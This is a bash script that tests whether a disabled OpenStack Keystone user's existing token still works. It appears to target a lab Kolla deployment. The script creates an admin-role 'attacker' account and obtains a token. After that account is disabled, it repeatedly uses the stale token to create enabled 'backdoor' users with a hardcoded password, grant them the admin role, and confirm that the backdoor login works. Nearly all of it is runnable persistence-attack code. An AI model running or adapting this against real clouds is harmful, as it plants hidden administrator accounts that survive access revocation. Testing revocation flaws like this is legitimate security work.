#!/bin/bash

echo "=== KEYSTONE USER CREATION ATTACK ==="
echo "Can disabled user create backdoor accounts?"
echo ""

source /etc/kolla/admin-openrc.sh

echo "[1] Creating attacker with ADMIN role..."
openstack user create --password attack123 keystone-attacker --domain default
openstack role add --user keystone-attacker --project admin admin
echo "Attacker created with admin role"
echo ""

echo "[2] Attacker authenticates..."
cat > /tmp/keystone-attacker-creds.sh << 'CREDS'
export OS_USERNAME=keystone-attacker
export OS_PASSWORD=attack123
export OS_PROJECT_NAME=admin
export OS_USER_DOMAIN_NAME=Default
export OS_PROJECT_DOMAIN_NAME=Default
export OS_IDENTITY_API_VERSION=3
export OS_AUTH_URL=http://192.168.100.11:5000
CREDS

source /tmp/keystone-attacker-creds.sh
ATTACK_TOKEN=$(openstack token issue -f value -c id)
echo "Token: ${ATTACK_TOKEN:0:30}..."
echo "Obtained at: $(date '+%T')"
echo ""

echo "[3] Testing Keystone access BEFORE disable..."
BEFORE=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "X-Auth-Token: $ATTACK_TOKEN" \
    http://192.168.100.11:5000/v3/users)
echo "Keystone response: $BEFORE"
echo ""

echo "[4] In another terminal, admin disables user..."
echo ""
echo "Run this NOW:"
echo "  source /etc/kolla/admin-openrc.sh"
echo "  openstack user set --disable keystone-attacker"
echo ""
read -p "Press ENTER after disabling..."

DISABLE_TIME=$(date '+%s')
echo "Attack starts at: $(date '+%T')"
echo ""

USERS_CREATED=0
ATTEMPTS=0

echo "--- Attempting to create backdoor users ---"
while [ $(( $(date '+%s') - DISABLE_TIME )) -lt 330 ]; do
    ELAPSED=$(( $(date '+%s') - DISABLE_TIME ))
    ATTEMPTS=$((ATTEMPTS + 1))

    echo ""
    echo "[Attempt $ATTEMPTS - ${ELAPSED}s after disable]"

    # Test Keystone API
    LIST_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "X-Auth-Token: $ATTACK_TOKEN" \
        http://192.168.100.11:5000/v3/users)

    echo "  Keystone API: $LIST_CODE"

    if [ "$LIST_CODE" = "200" ]; then
        echo "  ALERT: Still accessible! Creating user..."

        # Create backdoor user
        USERNAME="backdoor-${ELAPSED}s"
        RESULT=$(curl -s -w "\nHTTP:%{http_code}" \
            -H "X-Auth-Token: $ATTACK_TOKEN" \
            -H "Content-Type: application/json" \
            -X POST http://192.168.100.11:5000/v3/users \
            -d "{
                \"user\": {
                    \"name\": \"$USERNAME\",
                    \"password\": \"persist123\",
                    \"enabled\": true,
                    \"domain_id\": \"default\"
                }
            }")

        CODE=$(echo "$RESULT" | grep HTTP: | cut -d: -f2)

        if [ "$CODE" = "201" ]; then
            echo "  SUCCESS: User created: $USERNAME"
            USER_ID=$(echo "$RESULT" | grep -oP '"id":"[^"]+' | head -1 | cut -d'"' -f4)

            # Try to grant admin role
            source /etc/kolla/admin-openrc.sh
            ADMIN_PROJ=$(openstack project show admin -f value -c id)
            ADMIN_ROLE=$(openstack role show admin -f value -c id)

            ROLE_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
                -H "X-Auth-Token: $ATTACK_TOKEN" \
                -X PUT "http://192.168.100.11:5000/v3/projects/$ADMIN_PROJ/users/$USER_ID/roles/$ADMIN_ROLE")

            if [ "$ROLE_CODE" = "204" ]; then
                echo "  ALERT: Admin role granted!"
            fi

            USERS_CREATED=$((USERS_CREATED + 1))
        fi

        sleep 45
    elif [ "$LIST_CODE" = "401" ]; then
        echo "  Token invalidated"
        break
    fi
done

DURATION=$(( $(date '+%s') - DISABLE_TIME ))

echo ""
echo "========================================="
echo "Attack duration: ${DURATION}s"
echo "Backdoor users created: $USERS_CREATED"
echo "========================================="

if [ $USERS_CREATED -gt 0 ]; then
    echo ""
    echo "CRITICAL VULNERABILITY!"
    echo "Disabled admin created $USERS_CREATED persistent backdoors!"
    echo ""

    source /etc/kolla/admin-openrc.sh
    echo "--- Backdoor accounts ---"
    openstack user list | grep "backdoor-"

    echo ""
    echo "Testing backdoor login..."
    export OS_USERNAME=backdoor-0s
    export OS_PASSWORD=persist123
    export OS_PROJECT_NAME=admin
    export OS_USER_DOMAIN_NAME=Default
    export OS_PROJECT_DOMAIN_NAME=Default
    export OS_IDENTITY_API_VERSION=3
    export OS_AUTH_URL=http://192.168.100.11:5000

    if openstack token issue -c user_id 2>&1 | grep -q backdoor; then
        echo "Backdoor login WORKS - persistence confirmed!"
    fi
fi

rm -f /tmp/keystone-attacker-creds.sh
